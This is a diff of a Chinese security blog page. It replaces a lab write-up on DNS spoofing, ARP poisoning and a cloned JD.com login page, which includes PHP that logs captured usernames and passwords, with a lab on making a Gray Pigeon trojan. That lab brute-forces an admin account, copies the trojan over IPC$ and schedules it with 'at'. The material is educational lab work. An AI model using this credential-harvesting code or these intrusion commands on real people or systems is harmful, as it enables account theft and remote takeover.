@@ -6,31 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
-  <title>diaoyu | 一路走到黑</title>
+  <title>木马 | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="DNS欺骗、ARP攻击及钓鱼网站制作">
+  <meta name="description" content="初识木马">
 <meta property="og:type" content="article">
-<meta property="og:title" content="diaoyu">
-<meta property="og:url" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/index.html">
+<meta property="og:title" content="木马">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/index.html">
 <meta property="og:site_name" content="一路走到黑">
-<meta property="og:description" content="DNS欺骗、ARP攻击及钓鱼网站制作">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/9.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/10.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/tuopu.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/1.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/2.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/3.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/4.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/5.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/6.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/7.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/8.png">
-<meta property="article:published_time" content="2020-07-18T09:37:15.000Z">
-<meta property="article:modified_time" content="2020-07-18T12:33:28.562Z">
+<meta property="og:description" content="初识木马">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/4.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png">
+<meta property="article:published_time" content="2020-07-18T12:34:10.000Z">
+<meta property="article:modified_time" content="2020-07-18T14:31:20.560Z">
 <meta property="article:author" content="sunzy">
-<meta property="article:tag" content="sunzy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/9.png">
+<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png">
   
     <link rel="alternative" href="/atom.xml" title="一路走到黑" type="application/atom+xml">
   
@@ -162,34 +156,37 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-diaoyu" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-木马" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      diaoyu
+      木马
     </h1>
   
 
         
-        <a href="/2020/07/18/diaoyu/" class="archive-article-date">
-  	<time datetime="2020-07-18T09:37:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-18</time>
+        <a href="/2020/07/18/%E6%9C%A8%E9%A9%AC/" class="archive-article-date">
+  	<time datetime="2020-07-18T12:34:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a>
-<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="/2020/07/18/diaoyu/9.png" alt><br>修改index.html中的内容<br><img src="/2020/07/18/diaoyu/10.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$nam = stripslashes($_POST[<span class="string">'name'</span>]); <span class="comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span></span><br><span class="line">$pas = stripslashes($_POST[<span class="string">'pass'</span>]);<span class="comment">//pass也一样</span></span><br><span class="line">$content = <span class="string">"您已捕获京东账号及密码1个："</span> . <span class="string">" 用户名 "</span> . $nam . <span class="string">" 密码 "</span> . $pas;   <span class="comment">//保存捕获的用户名和密码</span></span><br><span class="line">$filed = @fopen(<span class="string">"1.txt"</span>, <span class="string">"a+"</span>);   <span class="comment">//打开1.txt</span></span><br><span class="line">@fwrite($filed, <span class="string">"$content\n"</span>);     <span class="comment">//将用户名和密码写入1.txt</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">goBack</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			window.history.back() <span class="comment">//后退+刷新</span></span><br><span class="line">		&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=<span class="string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
-<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p>
-<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="/2020/07/18/diaoyu/1.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p>
-<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2<br>  <img src="/2020/07/18/diaoyu/4.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
-<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" alt></p>
+        <h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><a id="more"></a>
+<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
+<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
+<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png" alt><br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/4.png" alt></p>
+<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/2.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/1.png" alt><br>获取账号密码<br>username：administrator<br>password: “”</p>
+<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
+<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
+<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
+<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
+<p>获取屏幕内容<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png" alt></p>
+<p>控制命令行<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png" alt></p>
 
       
 
@@ -219,17 +216,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sunzy</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -280,7 +266,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://sunzhengyu99.github.io/2020/07/18/diaoyu/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunzhengyu99.github.io/2020/07/18/%E6%9C%A8%E9%A9%AC/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -294,18 +280,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/07/18/%E7%88%AC%E5%9B%BE/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          爬图
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">php反序列化</div>
+    <a href="/2020/07/18/jdtest/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">jdtest</div>
       <i class="icon-circle-right"></i>
     </a>
   
